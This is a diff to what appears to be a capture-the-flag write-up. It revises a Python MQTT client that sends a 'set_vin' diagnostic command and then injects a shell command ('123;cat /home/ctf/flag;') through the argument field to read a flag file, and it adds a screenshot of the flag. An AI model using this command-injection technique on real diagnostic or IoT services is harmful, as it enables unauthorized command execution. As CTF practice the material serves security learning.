@@ -68,14 +68,14 @@ client.connect(broker, 36985, 60)
 cmd = {
     'auth': auth,
     'cmd': 'set_vin',
-    'arg': '123456789',
+    'arg': '1234567890',
 }
 client.loop_start()
-client.publish('diag', dumps(cmd))
-time.sleep(0.5)
-cmd['arg'] = ';cat /home/ctf/flag#'
-client.publish('diag', dumps(cmd))
 client.subscribe('diag/resp')
+client.publish('diag', dumps(cmd))
+time.sleep(1)
+cmd['arg'] = '123;cat /home/ctf/flag;'
+client.publish('diag', dumps(cmd))
 try:
     while True:
         time.sleep(0.5)
@@ -84,3 +84,5 @@ except KeyboardInterrupt:
 client.loop_stop()
 client.disconnect()
 ```
+
+![flag](assets/mqtt_flag.png)
